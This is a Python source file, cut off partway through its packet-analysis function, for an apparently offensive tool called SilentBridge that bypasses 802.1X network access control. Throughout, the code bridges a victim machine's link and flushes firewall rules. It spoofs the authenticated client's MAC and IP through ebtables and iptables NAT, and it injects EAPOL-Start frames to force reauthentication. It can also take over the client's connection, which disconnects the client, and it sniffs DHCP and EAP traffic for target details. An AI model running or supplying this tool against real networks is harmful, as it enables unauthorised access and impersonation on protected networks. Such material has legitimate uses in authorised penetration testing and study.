#!/usr/bin/env python3

import os
import time
import argparse
import subprocess
import netifaces
import sys
import json
from pathlib import Path
from scapy.all import Ether, EAPOL, DHCP, sniff, BOOTP, sendp
from threading import Thread, Event
from queue import Queue

class SilentBridge:
    def __init__(self):
        self.parser = self._create_parser()
        self.args = None
        self.config_file = os.path.expanduser('~/.silentbridge')
        self.stop_sniffing = Event()
        self.packet_queue = Queue()
        self.network_stack = None
        
        # Check if running as root
        if os.geteuid() != 0:
            print("[!] This script must be run as root!")
            sys.exit(1)
            
        # Detect network stack on initialization
        self.network_stack = self.check_network_stack()
        print("[*] Detected network stack:")
        for tool, available in self.network_stack.items():
            print(f"  - {tool}: {'Available' if available else 'Not available'}")
    
    def _create_parser(self):
        parser = argparse.ArgumentParser(description='SilentBridge - 802.1x Bypass Tool')
        
        subparsers = parser.add_subparsers(dest='command', help='Commands')
        
        # Install tools command
        install_parser = subparsers.add_parser('install-tools', help='Check and install required tools')
        install_parser.add_argument('--no-confirm', action='store_true', help='Skip confirmation before installing packages')
        
        # Analyze command
        analyze_parser = subparsers.add_parser('analyze', help='Analyze network interfaces and detect configuration')
        analyze_parser.add_argument('--interfaces', nargs='+', required=True, help='List of interfaces to analyze')
        analyze_parser.add_argument('--timeout', type=int, default=30, help='Timeout in seconds for analysis')
        
        # Autotakeover command
        autotakeover_parser = subparsers.add_parser('autotakeover', help='Automatically analyze, bridge and takeover client connection')
        autotakeover_parser.add_argument('--interfaces', nargs=2, required=True, help='Two ethernet interfaces to use')
        autotakeover_parser.add_argument('--timeout', type=int, default=30, help='Timeout in seconds for analysis')
        autotakeover_parser.add_argument('--bridge', default='br0', help='Bridge interface name')
        autotakeover_parser.add_argument('--veth-name', default='veth0', help='Name for the virtual ethernet device')
        
        # Create bridge command
        create_parser = subparsers.add_parser('create', help='Create a transparent bridge')
        create_parser.add_argument('--bridge', required=True, help='Bridge interface name')
        create_parser.add_argument('--phy', help='Interface connected to the client (the computer that authenticates itself)')
        create_parser.add_argument('--upstream', help='Upstream interface - The interface connected to the network/router')
        create_parser.add_argument('--use-legacy', action='store_true', help='Use legacy iptables instead of nf_tables')
        create_parser.add_argument('--use-stored-config', action='store_true', help='Use stored configuration from previous analysis')
        
        # Destroy bridge command
        destroy_parser = subparsers.add_parser('destroy', help='Destroy a bridge')
        destroy_parser.add_argument('--bridge', required=True, help='Bridge interface name')
        
        # Add interaction command
        interact_parser = subparsers.add_parser('interact', help='Add interaction to bridge')
        interact_parser.add_argument('--bridge', required=True, help='Bridge interface name')
        interact_parser.add_argument('--phy', required=True, help='Interface connected to the client (the computer that authenticates itself)')
        interact_parser.add_argument('--upstream', required=True, help='Upstream interface')
        interact_parser.add_argument('--client-mac', required=True, help='Client MAC address to impersonate')
        interact_parser.add_argument('--client-ip', required=True, help='Client IP address to impersonate')
        interact_parser.add_argument('--gw-mac', required=True, help='Gateway MAC address')
        interact_parser.add_argument('--use-legacy', action='store_true', help='Use legacy iptables instead of nf_tables')
        
        # Force reauthentication command
        reauth_parser = subparsers.add_parser('reauth', help='Force 802.1x reauthentication')
        reauth_parser.add_argument('--interface', required=True, help='Interface to send EAPOL-Start from')
        reauth_parser.add_argument('--client-mac', required=True, help='Client MAC address to impersonate')
        
        # Takeover command
        takeover_parser = subparsers.add_parser('takeover', help='Take over client connection by creating a virtual interface')
        takeover_parser.add_argument('--bridge', required=True, help='Bridge interface name')
        takeover_parser.add_argument('--phy', required=True, help='Physical interface to remove from bridge')
        takeover_parser.add_argument('--client-mac', required=True, help='Client MAC address to impersonate')
        takeover_parser.add_argument('--client-ip', required=True, help='Client IP address to impersonate')
        takeover_parser.add_argument('--netmask', default='255.255.255.0', help='Network mask for client IP')
        takeover_parser.add_argument('--gateway-ip', required=True, help='Gateway IP address')
        takeover_parser.add_argument('--veth-name', default='veth0', help='Name for the virtual ethernet device')
        
        # Autostart command
        autostart_parser = subparsers.add_parser('autostart', help='Configure SilentBridge to start on boot')
        autostart_group = autostart_parser.add_mutually_exclusive_group(required=True)
        autostart_group.add_argument('--enable', action='store_true', help='Enable autostart on boot')
        autostart_group.add_argument('--disable', action='store_true', help='Disable autostart on boot')
        autostart_parser.add_argument('--command', choices=['create', 'autotakeover'], default='create', 
                                     help='Command to run at startup (default: create)')
        autostart_parser.add_argument('--bridge', default='br0', help='Bridge interface name')
        autostart_parser.add_argument('--interfaces', nargs=2, help='Two ethernet interfaces to use (required for autotakeover)')
        autostart_parser.add_argument('--phy', help='Interface connected to the client (required for create)')
        autostart_parser.add_argument('--upstream', help='Upstream interface (required for create)')
        
        return parser
    
    def run(self):
        self.args = self.parser.parse_args()
        
        if self.args.command == 'install-tools':
            self.install_tools()
        elif self.args.command == 'analyze':
            self.analyze_network()
        elif self.args.command == 'create':
            # If using stored config, load it
            if self.args.use_stored_config:
                config = self.load_config()
                if config:
                    if not self.args.phy:
                        self.args.phy = config.get('phy_interface')
                    if not self.args.upstream:
                        self.args.upstream = config.get('upstream_interface')
            self.create_transparent_bridge()
        elif self.args.command == 'destroy':
            self.destroy_bridge()
        elif self.args.command == 'interact':
            self.add_interaction()
        elif self.args.command == 'reauth':
            self.force_reauthentication()
        elif self.args.command == 'takeover':
            self.takeover_client()
        elif self.args.command == 'autotakeover':
            self.autotakeover()
        elif self.args.command == 'autostart':
            self.configure_autostart()
        else:
            self.parser.print_help()
    
    def run_command(self, command, shell=False, ignore_errors=False):
        """Run a shell command and return output"""
        try:
            if shell:
                result = subprocess.run(command, shell=True, check=not ignore_errors, 
                                       stdout=subprocess.PIPE, stderr=subprocess.PIPE, 
                                       universal_newlines=True)
            else:
                result = subprocess.run(command.split(), check=not ignore_errors, 
                                       stdout=subprocess.PIPE, stderr=subprocess.PIPE, 
                                       universal_newlines=True)
            return result.stdout
        except subprocess.CalledProcessError as e:
            if not ignore_errors:
                print(f"Command failed: {e}")
                print(f"Error output: {e.stderr}")
            return None
    
    def check_command_exists(self, command):
        """Check if a command exists in the system"""
        try:
            subprocess.run(["which", command], check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            return True
        except subprocess.CalledProcessError:
            return False
    
    def check_interface_exists(self, interface):
        """Check if an interface exists"""
        return os.path.exists(f"/sys/class/net/{interface}")
    
    def check_interface_in_bridge(self, bridge, interface):
        """Check if an interface is already in a bridge"""
        if not os.path.exists(f"/sys/devices/virtual/net/{bridge}/brif"):
            return False
        
        try:
            bridge_interfaces = os.listdir(f"/sys/devices/virtual/net/{bridge}/brif")
            return interface in bridge_interfaces
        except:
            return False
    
    def write_sysfs(self, path, value):
        """Safely write to sysfs files"""
        if not os.path.exists(path):
            print(f"[!] Warning: Path {path} does not exist")
            return False
        
        try:
            # Handle hexadecimal values properly
            if isinstance(value, str) and value.startswith("0x"):
                # Convert hex string to integer
                int_value = int(value, 16)
                value = str(int_value)
            
            with open(path, 'w') as f:
                f.write(str(value))
            return True
        except Exception as e:
            print(f"[!] Warning: Could not write to {path}: {e}")
            return False
    
    def make_bridge_transparent(self, bridge_name):
        """Configure bridge to be completely transparent"""
        print("[*] Making bridge completely transparent...")
        
        # Disable STP on the bridge
        self.run_command(f"brctl stp {bridge_name} off", ignore_errors=True)
        
        # Set bridge ageing time to 0 (don't age out entries)
        self.run_command(f"brctl setageing {bridge_name} 0", ignore_errors=True)
        
        # Disable multicast snooping
        if os.path.exists(f"/sys/devices/virtual/net/{bridge_name}/bridge/multicast_snooping"):
            self.write_sysfs(f"/sys/devices/virtual/net/{bridge_name}/bridge/multicast_snooping", "0")
        
        # Set forward delay to 0
        self.run_command(f"brctl setfd {bridge_name} 0", ignore_errors=True)
        
        # Enable promiscuous mode on the bridge
        self.run_command(f"ip link set {bridge_name} promisc on", ignore_errors=True)
        
        # Set group_fwd_mask to forward all BPDUs and other reserved addresses
        # Try different methods to set this value
        if os.path.exists(f"/sys/class/net/{bridge_name}/bridge/group_fwd_mask"):
            try:
                # Try direct command first
                self.run_command(f"echo 65535 > /sys/class/net/{bridge_name}/bridge/group_fwd_mask", shell=True, ignore_errors=True)
            except:
                # Then try our write_sysfs method
                self.write_sysfs(f"/sys/class/net/{bridge_name}/bridge/group_fwd_mask", "65535")
        
        # Disable IGMP snooping if available
        if os.path.exists(f"/sys/devices/virtual/net/{bridge_name}/bridge/multicast_igmp_version"):
            try:
                # Try direct command first
                self.run_command(f"echo 0 > /sys/devices/virtual/net/{bridge_name}/bridge/multicast_igmp_version", shell=True, ignore_errors=True)
            except:
                # Then try our write_sysfs method
                self.write_sysfs(f"/sys/devices/virtual/net/{bridge_name}/bridge/multicast_igmp_version", "0")
        
        # Disable bridge learning
        if os.path.exists(f"/sys/devices/virtual/net/{bridge_name}/brif"):
            for iface in os.listdir(f"/sys/devices/virtual/net/{bridge_name}/brif"):
                if os.path.exists(f"/sys/devices/virtual/net/{bridge_name}/brif/{iface}/learning"):
                    self.write_sysfs(f"/sys/devices/virtual/net/{bridge_name}/brif/{iface}/learning", "0")
    
    def get_iptables_command(self, command, use_legacy=None):
        """Get the appropriate iptables command (legacy or nf_tables)"""
        if use_legacy is None:
            use_legacy = getattr(self.args, 'use_legacy', False)
        
        if use_legacy:
            if command == "iptables":
                return "iptables-legacy"
            elif command == "ebtables":
                return "ebtables-legacy"
            elif command == "arptables":
                return "arptables-legacy"
        
        return command
    
    def create_transparent_bridge(self):
        """Create a transparent bridge without interaction"""
        print("[*] Creating transparent bridge...")
        
        # Check if interfaces exist
        for iface in [self.args.phy, self.args.upstream]:
            if not self.check_interface_exists(iface):
                print(f"[!] Interface {iface} does not exist!")
                return
        
        # If NetworkManager is present, unmanage the interfaces
        if self.network_stack['networkmanager']:
            for iface in [self.args.phy, self.args.upstream]:
                self.handle_networkmanager_interface(iface, 'unmanage')
        
        # Check if macchanger is installed
        if not self.check_command_exists("macchanger"):
            print("[!] macchanger is not installed. Please install it with 'apt-get install macchanger'")
            print("[*] Continuing without MAC address change...")
        
        # Get upstream MAC address
        try:
            upstream_mac = netifaces.ifaddresses(self.args.upstream)[netifaces.AF_LINK][0]['addr']
            print(f"[*] Upstream MAC address: {upstream_mac}")
        except (KeyError, IndexError):
            print(f"[!] Could not get MAC address for {self.args.upstream}")
            upstream_mac = None
        
        # Load br_netfilter kernel module
        print("[*] Making sure br_netfilter kernel module is loaded...")
        self.run_command("modprobe br_netfilter", ignore_errors=True)
        
        # Disable IPv6
        print("[*] Disabling IPv6...")
        self.write_sysfs("/proc/sys/net/ipv6/conf/all/disable_ipv6", "1")
        
        # Reset firewall rules
        print("[*] Resetting firewall rules...")
        iptables_cmd = self.get_iptables_command("iptables")
        ebtables_cmd = self.get_iptables_command("ebtables")
        arptables_cmd = self.get_iptables_command("arptables")
        
        self.run_command(f"{iptables_cmd} -F", ignore_errors=True)
        self.run_command(f"{ebtables_cmd} -F", ignore_errors=True)
        self.run_command(f"{arptables_cmd} -F", ignore_errors=True)
        
        # Check if bridge already exists
        if self.check_interface_exists(self.args.bridge):
            print(f"[*] Bridge {self.args.bridge} already exists, skipping creation...")
        else:
            # Create the bridge using appropriate command
            print(f"[*] Creating bridge {self.args.bridge}...")
            if self.network_stack['bridge']:
                self.run_command(f"ip link add name {self.args.bridge} type bridge")
            elif self.network_stack['brctl']:
                self.run_command(f"brctl addbr {self.args.bridge}")
            else:
                print("[!] No bridge creation tools found (ip or brctl)")
                return
        
        # Make the bridge completely transparent
        self.make_bridge_transparent(self.args.bridge)
        
        # Add interfaces to the bridge if not already added
        print("[*] Adding interfaces to the bridge...")
        for iface in [self.args.phy, self.args.upstream]:
            if self.check_interface_in_bridge(self.args.bridge, iface):
                print(f"[*] Interface {iface} is already in bridge {self.args.bridge}, skipping...")
            else:
                if self.network_stack['bridge']:
                    self.run_command(f"ip link set {iface} master {self.args.bridge}", ignore_errors=True)
                else:
                    self.run_command(f"brctl addif {self.args.bridge} {iface}", ignore_errors=True)
        
        # Bring interfaces up using appropriate command
        print("[*] Bringing interfaces up in promiscuous mode...")
        for iface in [self.args.phy, self.args.upstream]:
            if self.network_stack['ip']:
                self.run_command(f"ip link set {iface} up promisc on", ignore_errors=True)
            else:
                self.run_command(f"ifconfig {iface} 0.0.0.0 up promisc", ignore_errors=True)
        
        time.sleep(2)
        
        # Initiate radio silence
        print("[*] Initiating radio silence...")
        try:
            self.run_command(f"{iptables_cmd} -A OUTPUT -j DROP", ignore_errors=True)
            self.run_command(f"{arptables_cmd} -A OUTPUT -j DROP", ignore_errors=True)
        except Exception as e:
            print(f"[!] Warning: Could not set up firewall rules: {e}")
        
        # Bring the bridge up
        print("[*] Bringing the bridge up...")
        if self.check_command_exists("macchanger") and upstream_mac:
            self.run_command(f"macchanger -m {upstream_mac} {self.args.bridge}", ignore_errors=True)
        
        if self.network_stack['ip']:
            self.run_command(f"ip link set {self.args.bridge} up promisc on", ignore_errors=True)
        else:
            self.run_command(f"ifconfig {self.args.bridge} 0.0.0.0 up promisc", ignore_errors=True)
        
        # Lift radio silence
        print("[*] Lifting radio silence...")
        try:
            self.run_command(f"{iptables_cmd} -D OUTPUT -j DROP", ignore_errors=True)
            self.run_command(f"{arptables_cmd} -D OUTPUT -j DROP", ignore_errors=True)
        except Exception as e:
            print(f"[!] Warning: Could not lift radio silence: {e}")
        
        # Reset the links
        print("[*] Resetting the links...")
        self.run_command(f"ethtool -r {self.args.upstream}", ignore_errors=True)
        self.run_command(f"ethtool -r {self.args.phy}", ignore_errors=True)
        
        print("[+] Bridge created successfully!")
    
    def destroy_bridge(self):
        """Destroy the bridge and free all interfaces"""
        print(f"[*] Destroying bridge {self.args.bridge}...")
        
        # Check if the bridge exists
        if not self.check_interface_exists(self.args.bridge):
            print(f"[!] Bridge {self.args.bridge} does not exist!")
            return
        
        try:
            # Get all interfaces in the bridge
            bridge_interfaces = []
            if os.path.exists(f"/sys/devices/virtual/net/{self.args.bridge}/brif"):
                bridge_interfaces = os.listdir(f"/sys/devices/virtual/net/{self.args.bridge}/brif")
                
                # Bring down all interfaces
                print("[*] Bringing down all interfaces...")
                for iface in bridge_interfaces:
                    if self.network_stack['ip']:
                        self.run_command(f"ip link set {iface} down", ignore_errors=True)
                    else:
                        self.run_command(f"ifconfig {iface} down", ignore_errors=True)
            
            # Bring down the bridge
            print("[*] Bringing down the bridge...")
            if self.network_stack['ip']:
                self.run_command(f"ip link set {self.args.bridge} down", ignore_errors=True)
            else:
                self.run_command(f"ifconfig {self.args.bridge} down", ignore_errors=True)
            
            # Remove interfaces from the bridge
            print("[*] Removing interfaces from the bridge...")
            for iface in bridge_interfaces:
                if self.network_stack['bridge']:
                    self.run_command(f"ip link set {iface} nomaster", ignore_errors=True)
                else:
                    self.run_command(f"brctl delif {self.args.bridge} {iface}", ignore_errors=True)
            
            # Delete the bridge
            print("[*] Deleting the bridge...")
            if self.network_stack['bridge']:
                self.run_command(f"ip link delete {self.args.bridge} type bridge", ignore_errors=True)
            else:
                self.run_command(f"brctl delbr {self.args.bridge}", ignore_errors=True)
            
            # Return interfaces to NetworkManager if present
            if self.network_stack['networkmanager']:
                for iface in bridge_interfaces:
                    self.handle_networkmanager_interface(iface, 'manage')
                    # Wait for NetworkManager to take control
                    time.sleep(2)
                    # Bring up the interface with NetworkManager
                    self.run_command(f"nmcli device connect {iface}", ignore_errors=True)
            else:
                # Bring up interfaces using traditional methods
                for iface in bridge_interfaces:
                    if self.network_stack['ip']:
                        self.run_command(f"ip link set {iface} up", ignore_errors=True)
                    else:
                        self.run_command(f"ifconfig {iface} up", ignore_errors=True)
            
            print("[+] Bridge destroyed successfully!")
            
        except Exception as e:
            print(f"[!] Error: {e}")
    
    def add_interaction(self):
        """Add interaction to transparent bridge"""
        print("[*] Adding interaction to bridge...")
        
        # Check if bridge exists
        if not self.check_interface_exists(self.args.bridge):
            print(f"[!] Bridge {self.args.bridge} does not exist!")
            return
        
        # Check if interfaces exist
        for iface in [self.args.phy, self.args.upstream]:
            if not self.check_interface_exists(iface):
                print(f"[!] Interface {iface} does not exist!")
                return
        
        # Get upstream MAC address
        try:
            upstream_mac = netifaces.ifaddresses(self.args.upstream)[netifaces.AF_LINK][0]['addr']
            print(f"[*] Upstream MAC address: {upstream_mac}")
        except (KeyError, IndexError):
            print(f"[!] Could not get MAC address for {self.args.upstream}")
            upstream_mac = None
            return
        
        # Make sure br_netfilter is loaded
        print("[*] Making sure br_netfilter kernel module is loaded...")
        self.run_command("modprobe br_netfilter", ignore_errors=True)
        
        # Disable IPv6
        print("[*] Disabling IPv6...")
        self.write_sysfs("/proc/sys/net/ipv6/conf/all/disable_ipv6", "1")
        
        # Make sure the bridge is completely transparent
        self.make_bridge_transparent(self.args.bridge)
        
        # Get iptables commands
        iptables_cmd = self.get_iptables_command("iptables")
        ebtables_cmd = self.get_iptables_command("ebtables")
        arptables_cmd = self.get_iptables_command("arptables")
        
        # Configure bridge IP using appropriate method
        print("[*] Configuring bridge IP address...")
        if self.network_stack['networkmanager']:
            # Remove any existing connection
            self.run_command(f"nmcli connection delete {self.args.bridge}", ignore_errors=True)
            
            # Create new bridge connection
            self.run_command(f"nmcli connection add type bridge con-name {self.args.bridge} ifname {self.args.bridge} \
                             ipv4.addresses 169.254.66.66/24 ipv4.method manual", ignore_errors=True)
            
            # Activate the connection
            self.run_command(f"nmcli connection up {self.args.bridge}", ignore_errors=True)
        else:
            # Configure using traditional methods
            if self.network_stack['ip']:
                self.run_command(f"ip addr add 169.254.66.66/24 dev {self.args.bridge}", ignore_errors=True)
                self.run_command(f"ip link set {self.args.bridge} up promisc on", ignore_errors=True)
            else:
                self.run_command(f"ifconfig {self.args.bridge} 169.254.66.66 up promisc", ignore_errors=True)
        
        time.sleep(3)
        
        # Initiate radio silence
        print("[*] Initiating radio silence...")
        try:
            self.run_command(f"{iptables_cmd} -A OUTPUT -j DROP", ignore_errors=True)
            self.run_command(f"{arptables_cmd} -A OUTPUT -j DROP", ignore_errors=True)
        except Exception as e:
            print(f"[!] Warning: Could not set up firewall rules: {e}")
        
        time.sleep(3)
        
        # Establish Layer 2 source NAT
        print("[*] Establishing Layer 2 source NAT...")
        try:
            self.run_command(f"{ebtables_cmd} -t nat -A POSTROUTING -s {upstream_mac} -o {self.args.upstream} -j snat --to-src {self.args.client_mac}", ignore_errors=True)
            self.run_command(f"{ebtables_cmd} -t nat -A POSTROUTING -s {upstream_mac} -o {self.args.bridge} -j snat --to-src {self.args.client_mac}", ignore_errors=True)
        except Exception as e:
            print(f"[!] Warning: Could not set up Layer 2 NAT: {e}")
        
        time.sleep(3)
        
        # Set default gateway and static ARP entry
        print("[*] Setting default gateway and static ARP entry...")
        self.run_command(f"arp -s -i {self.args.bridge} 169.254.66.1 {self.args.gw_mac}", ignore_errors=True)
        
        if self.network_stack['ip']:
            self.run_command(f"ip route add default via 169.254.66.1", ignore_errors=True)
        else:
            self.run_command("route add default gw 169.254.66.1", ignore_errors=True)
        
        time.sleep(3)
        
        # Establish Layer 3 source NAT
        print("[*] Establishing Layer 3 source NAT...")
        try:
            self.run_command(f"{iptables_cmd} -t nat -A POSTROUTING -o {self.args.bridge} -s 169.254.66.66 -p tcp -j SNAT --to {self.args.client_ip}:61000-62000", ignore_errors=True)
            self.run_command(f"{iptables_cmd} -t nat -A POSTROUTING -o {self.args.bridge} -s 169.254.66.66 -p udp -j SNAT --to {self.args.client_ip}:61000-62000", ignore_errors=True)
            self.run_command(f"{iptables_cmd} -t nat -A POSTROUTING -o {self.args.bridge} -s 169.254.66.66 -p icmp -j SNAT --to {self.args.client_ip}", ignore_errors=True)
        except Exception as e:
            print(f"[!] Warning: Could not set up Layer 3 NAT: {e}")
        
        time.sleep(3)
        
        # Lift radio silence
        print("[*] Lifting radio silence...")
        try:
            self.run_command(f"{iptables_cmd} -D OUTPUT -j DROP", ignore_errors=True)
            self.run_command(f"{arptables_cmd} -D OUTPUT -j DROP", ignore_errors=True)
        except Exception as e:
            print(f"[!] Warning: Could not lift radio silence: {e}")
        
        print("[+] Interaction added successfully!")
    
    def force_reauthentication(self):
        """Force 802.1x reauthentication by sending EAPOL-Start packet"""
        print(f"[*] Forcing reauthentication for {self.args.client_mac}...")
        
        # Check if interface exists
        if not self.check_interface_exists(self.args.interface):
            print(f"[!] Interface {self.args.interface} does not exist!")
            return
        
        # Send EAPOL-Start packet
        try:
            sendp(Ether(src=self.args.client_mac, dst="01:80:c2:00:00:03")/EAPOL(type=1), 
                  iface=self.args.interface)
            print("[+] EAPOL-Start packet sent successfully!")
        except Exception as e:
            print(f"[!] Error sending EAPOL-Start packet: {e}")
    
    def takeover_client(self):
        """Take over client connection by removing phy interface from bridge and creating a virtual interface"""
        print("[*] Starting client takeover operation...")
        
        try:
            # Check if the bridge exists
            if not self.check_interface_exists(self.args.bridge):
                print(f"[!] Bridge {self.args.bridge} does not exist!")
                return
            
            # Check if the physical interface is in the bridge
            if not self.check_interface_in_bridge(self.args.bridge, self.args.phy):
                print(f"[!] Physical interface {self.args.phy} is not in bridge {self.args.bridge}!")
                return
            
            # Remove the physical interface from the bridge
            print(f"[*] Removing {self.args.phy} from bridge {self.args.bridge}...")
            if self.network_stack['ip']:
                self.run_command(f"ip link set {self.args.phy} down", ignore_errors=True)
                self.run_command(f"ip link set {self.args.phy} nomaster", ignore_errors=True)
            else:
                self.run_command(f"ifconfig {self.args.phy} down", ignore_errors=True)
                self.run_command(f"brctl delif {self.args.bridge} {self.args.phy}", ignore_errors=True)
            
            # Check if the virtual interface already exists and remove it if it does
            if self.check_interface_exists(self.args.veth_name):
                print(f"[*] Virtual interface {self.args.veth_name} already exists, removing it...")
                if self.network_stack['networkmanager']:
                    self.run_command(f"nmcli connection delete {self.args.veth_name}", ignore_errors=True)
                self.run_command(f"ip link delete {self.args.veth_name}", ignore_errors=True)
            
            # Create a virtual ethernet device
            print(f"[*] Creating virtual ethernet device {self.args.veth_name}...")
            self.run_command(f"ip link add {self.args.veth_name} type veth peer name {self.args.veth_name}_peer", ignore_errors=True)
            
            # Add the virtual interface to the bridge
            print(f"[*] Adding {self.args.veth_name}_peer to bridge {self.args.bridge}...")
            if self.network_stack['bridge']:
                self.run_command(f"ip link set {self.args.veth_name}_peer master {self.args.bridge}", ignore_errors=True)
            else:
                self.run_command(f"brctl addif {self.args.bridge} {self.args.veth_name}_peer", ignore_errors=True)
            
            if self.network_stack['ip']:
                self.run_command(f"ip link set {self.args.veth_name}_peer up promisc on", ignore_errors=True)
            else:
                self.run_command(f"ifconfig {self.args.veth_name}_peer up promisc", ignore_errors=True)
            
            # Make sure the bridge is still completely transparent
            self.make_bridge_transparent(self.args.bridge)
            
            # Set the MAC address and configure IP for the virtual interface
            print(f"[*] Configuring {self.args.veth_name}...")
            
            if self.network_stack['networkmanager']:
                # Remove any existing connection
                self.run_command(f"nmcli connection delete {self.args.veth_name}", ignore_errors=True)
                
                # Create new connection with specified MAC and IP
                self.run_command(f"nmcli connection add type ethernet \
                                 con-name {self.args.veth_name} \
                                 ifname {self.args.veth_name} \
                                 ipv4.addresses {self.args.client_ip}/{self.args.netmask} \
                                 ipv4.gateway {self.args.gateway_ip} \
                                 ipv4.method manual \
                                 802-3-ethernet.cloned-mac-address {self.args.client_mac}", ignore_errors=True)
                
                # Activate the connection
                self.run_command(f"nmcli connection up {self.args.veth_name}", ignore_errors=True)
            else:
                # Set MAC address using traditional methods
                if self.network_stack['ip']:
                    self.run_command(f"ip link set {self.args.veth_name} down", ignore_errors=True)
                else:
                    self.run_command(f"ifconfig {self.args.veth_name} down", ignore_errors=True)
                
                if self.check_command_exists("macchanger"):
                    self.run_command(f"macchanger -m {self.args.client_mac} {self.args.veth_name}", ignore_errors=True)
                else:
                    print("[!] macchanger is not installed. Trying to set MAC address using ip command...")
                    self.run_command(f"ip link set dev {self.args.veth_name} address {self.args.client_mac}", ignore_errors=True)
                
                # Configure IP address
                if self.network_stack['ip']:
                    self.run_command(f"ip addr add {self.args.client_ip}/{self.args.netmask} dev {self.args.veth_name}", ignore_errors=True)
                    self.run_command(f"ip link set {self.args.veth_name} up promisc on", ignore_errors=True)
                else:
                    self.run_command(f"ifconfig {self.args.veth_name} {self.args.client_ip} netmask {self.args.netmask} up promisc", ignore_errors=True)
                
                # Add default route
                print(f"[*] Setting default gateway to {self.args.gateway_ip}...")
                # First delete any existing default routes
                self.run_command("ip route del default", ignore_errors=True)
                
                if self.network_stack['ip']:
                    self.run_command(f"ip route add default via {self.args.gateway_ip}", ignore_errors=True)
                else:
                    self.run_command(f"route add default gw {self.args.gateway_ip}", ignore_errors=True)
            
            # Enable IP forwarding
            print("[*] Enabling IP forwarding...")
            self.write_sysfs("/proc/sys/net/ipv4/ip_forward", "1")
            
            # Reset the link
            print("[*] Resetting the link...")
            self.run_command(f"ethtool -r {self.args.veth_name}", ignore_errors=True)
            
            print(f"[+] Takeover complete! The system is now using {self.args.veth_name} with client's MAC and IP.")
            print(f"[+] The client has been disconnected from the network.")
            
        except Exception as e:
            print(f"[!] Error during takeover: {e}")

    def load_config(self):
        """Load stored configuration from file"""
        try:
            if os.path.exists(self.config_file):
                with open(self.config_file, 'r') as f:
                    return json.load(f)
        except Exception as e:
            print(f"[!] Error loading configuration: {e}")
        return {}

    def save_config(self, config):
        """Save configuration to file"""
        try:
            with open(self.config_file, 'w') as f:
                json.dump(config, f)
        except Exception as e:
            print(f"[!] Error saving configuration: {e}")

    def packet_callback(self, packet):
        """Callback function for packet analysis"""
        if self.stop_sniffing.is_set():
            return
        
        self.packet_queue.put(packet)

    def analyze_packets(self, timeout):
        """Analyze collected packets to determine network configuration
        
        This method analyzes packets to determine:
        1. Which interface is connected to the client (phy_interface)
        2. Which interface is connected to the network/upstream (upstream_interface)
        3. Client MAC and IP addresses
        4. Router/Gateway MAC and IP addresses
        
        The analysis works differently depending on whether the bridge is created or not:
        
        Before bridge creation:
        - Client side (phy) indicators: EAPOL Start messages, DHCP Requests
        - Network side (upstream) indicators: EAP Request Identity packets
        
        After bridge creation:
        - Client side (phy) indicators: EAPOL Start messages, DHCP Requests
        - Network side (upstream) indicators: EAP Request Identity, DHCP Offers
        """
        end_time = time.time() + timeout
        config = {
            'phy_interface': None,
            'upstream_interface': None,
            'client_mac': None,
            'client_ip': None,
            'router_mac': None,
            'router_ip': None
        }
        
        # Track interfaces where specific packets are seen
        client_side_interfaces = set()  # Interfaces where client packets are seen
        network_side_interfaces = set()  # Interfaces where network packets are seen
        dhcp_transactions = {}  # Track DHCP transactions
        
        # Check if bridge exists (to determine analysis mode)
        bridge_exists = False
        if hasattr(self.args, 'bridge') and self.check_interface_exists(self.args.bridge):
            bridge_exists = True
            print("[*] Bridge exists, analyzing traffic through bridge...")
        else:
            print("[*] No bridge detected, analyzing direct interface traffic...")
        
        while time.time() < end_time:
            try:
                packet = self.packet_queue.get(timeout=1)
                
                # Extract interface and MAC addresses
                interface = packet.sniffed_on
                src_mac = packet[Ether].src
                dst_mac = packet[Ether].dst
                
                # Check for EAPOL packets
                if EAPOL in packet:
                    if packet[EAPOL].type == 1:  # EAPOL-Start (from client)
                        client_side_interfaces.add(interface)
                        config['client_mac'] = src_mac
                        print(f"[*] Detected EAPOL-Start from {src_mac} on {interface} (client side)")
                    
                    # Check for EAP packets within EAPOL
                    if packet.haslayer('EAP'):
                        if packet['EAP'].code == 1:  # EAP Request
                            if packet['EAP'].type == 1:  # Identity Request (from network)
                                network_side_interfaces.add(interface)
                                config['router_mac'] = src_mac
                                print(f"[*] Detected EAP Identity Request from {src_mac} on {interface} (network side)")
                
                # Check for DHCP packets
                if DHCP in packet:
                    message_type = None
                    for opt in packet[DHCP].options:
                        if isinstance(opt, tuple) and opt[0] == 'message-type':
                            message_type = opt[1]
                            break
                    
                    if message_type == 1:  # DHCP Discover (from client)
                        client_side_interfaces.add(interface)
                        print(f"[*] Detected DHCP Discover from {src_mac} on {interface} (client side)")
                    
                    elif message_type == 3:  # DHCP Request (from client)
                        client_side_interfaces.add(interface)
                        config['client_mac'] = src_mac
                        print(f"[*] Detected DHCP Request from {src_mac} on {interface} (client side)")
                        
                        # Track DHCP transaction
                        transaction_id = packet[BOOTP].xid
                        dhcp_transactions[transaction_id] = {
                            'client_mac': src_mac,
                            'interface': interface
                        }
                    
                    elif message_type == 2:  # DHCP Offer (from network)
                        network_side_interfaces.add(interface)
                        config['router_mac'] = src_mac
                        print(f"[*] Detected DHCP Offer from {src_mac} on {interface} (network side)")
                    
                    elif message_type == 5:  # DHCP ACK (from network)
                        network_side_interfaces.add(interface)
                        config['router_mac'] = src_mac
                        print(f"[*] Detected DHCP ACK from {src_mac} on {interface} (network side)")
                        
                        # Complete DHCP transaction
                        transaction_id = packet[BOOTP].xid
                        if transaction_id in dhcp_transactions:
                            config['client_mac'] = dhcp_transactions[transaction_id]['client_mac']
                            config['client_ip'] = packet[BOOTP].yiaddr
                            config['router_ip'] = packet[BOOTP].siaddr
                            config['phy_interface'] = dhcp_transactions[transaction_id]['interface']
                            config['upstream_interface'] = interface
                            print(f"[*] Completed DHCP transaction: Client IP {config['client_ip']}, Router IP {config['router_ip']}")
                
            except Exception as e:
                print(f"[!] Error processing packet: {e}")
                continue
            
            # If we have all the information we need, we can stop early
            if all(v is not None for v in [config['client_mac'], config['client_ip'], 
                                          config['router_mac'], config['router_ip'],
                                          config['phy_interface'], config['upstream_interface']]):
                print("[+] All network information collected, stopping analysis early")
                break
        
        # If we couldn't determine interfaces from complete DHCP transactions,
        # use the client and network side interface sets
        if config['phy_interface'] is None and client_side_interfaces:
            if len(client_side_interfaces) == 1:
                config['phy_interface'] = list(client_side_interfaces)[0]
                print(f"[*] Determined client interface (phy): {config['phy_interface']}")
        
        if config['upstream_interface'] is None and network_side_interfaces:
            if len(network_side_interfaces) == 1:
